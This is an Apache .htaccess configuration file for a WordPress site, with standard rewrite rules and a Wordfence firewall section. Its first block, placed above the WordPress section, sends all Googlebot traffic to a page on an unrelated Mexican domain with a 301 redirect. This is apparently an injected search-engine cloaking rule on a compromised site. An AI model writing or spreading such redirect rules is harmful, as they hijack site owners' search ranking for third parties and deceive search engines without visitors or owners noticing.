RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
RewriteCond %{REQUEST_URI} !^/derecho-de-tramite-aduanero-dta/
RewriteRule ^(.*)$ https://aaag.org.mx/derecho-de-tramite-aduanero-dta/ [R=301,L]

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress
# SGO Unset Vary
  Header unset Vary
# SGO Unset Vary END

# Wordfence WAF
<IfModule mod_php5.c>
	php_value auto_prepend_file '/home/customer/www/santuariosantarita.it/public_html/wordfence-waf.php'
</IfModule>
<IfModule mod_php7.c>
	php_value auto_prepend_file '/home/customer/www/santuariosantarita.it/public_html/wordfence-waf.php'
</IfModule>
<IfModule mod_php.c>
	php_value auto_prepend_file '/home/customer/www/santuariosantarita.it/public_html/wordfence-waf.php'
</IfModule>
<Files ".user.ini">
<IfModule mod_authz_core.c>
	Require all denied
</IfModule>
<IfModule !mod_authz_core.c>
	Order deny,allow
	Deny from all
</IfModule>
</Files>

# END Wordfence WAF
